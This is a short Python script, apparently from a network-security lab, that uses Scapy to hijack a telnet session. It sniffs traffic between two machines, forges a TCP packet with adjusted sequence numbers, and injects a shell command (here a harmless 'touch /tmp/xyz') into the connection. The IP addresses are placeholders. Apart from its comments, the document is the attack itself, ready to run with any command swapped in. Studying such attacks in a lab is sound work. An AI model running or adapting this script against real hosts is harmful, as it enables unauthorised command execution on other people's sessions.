#!/usr/bin/python3
from scapy.all import *

M01_IP = "1.1.1.1" #replace with IP address of Machine 1
M02_IP = "1.1.1.1" #replace with IP address of Machine 2
M03_IP = "1.1.1.1" #replace with IP address of Machine 3

def spoof(pkt):
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
    newseq = old_tcp.seq + 1
    newack = old_tcp.ack + 1
    ip = IP(src = M02_IP, dst = M03_IP)
    tcp = TCP(sport = old_tcp.sport, dport=23, flags='A', seq=newseq, ack=newack)
    data = "\n/usr/bin/touch /tmp/xyz\n"
    pkt = ip/tcp/data
    ls(pkt)
    send(pkt, verbose=0)
    quit()

myFilter = "tcp and src host " + M02_IP + " and dst host " + M03_IP + " and dst port 23"
sniff(filter=myFilter, prn=spoof)